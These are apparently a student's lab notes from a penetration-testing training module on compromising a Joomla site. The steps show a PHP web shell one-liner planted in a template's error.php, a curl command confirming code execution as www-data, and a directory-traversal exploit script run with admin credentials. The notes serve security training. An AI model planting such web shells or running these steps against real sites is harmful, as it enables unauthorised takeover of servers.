## Abusing Built-In Functionality
```url
http://dev.inlanefreight.local/administrator/index.php
```
![](Pasted%20image%2020260729111757.png)

```url
http://dev.inlanefreight.local/administrator/index.php?option=com_templates
```
![](Pasted%20image%2020260729111805.png)

```url
http://dev.inlanefreight.local/administrator/index.php?option=com_templates&view=template&id=506
```
![](Pasted%20image%2020260729111827.png)

Let's choose the `error.php` page. We'll add a PHP one-liner to gain code execution as follows.

```php
system($_GET['dcfdd5e021a869fcc6dfaef8bf31377e']);
```

```url
http://dev.inlanefreight.local/administrator/index.php?option=com_templates&view=template&id=506&file=L2Vycm9yLnBocA%3D%3D
```
![](Pasted%20image%2020260729112123.png)

Once this is in, click on `Save & Close` at the top and confirm code execution using `cURL`.

```shell
3kjS@htb[/htb]$ curl -s http://dev.inlanefreight.local/templates/protostar/error.php?dcfdd5e021a869fcc6dfaef8bf31377e=id 

uid=33(www-data) gid=33(www-data) groups=33(www-data)
```
## Leveraging Known Vulnerabilities

```shell
3kjS@htb[/htb]$ python2.7 joomla_dir_trav.py --url "http://dev.inlanefreight.local/administrator/" --username admin --password admin --dir /
```
![](Screenshot%202026-07-29%20at%2011.22.09.png)
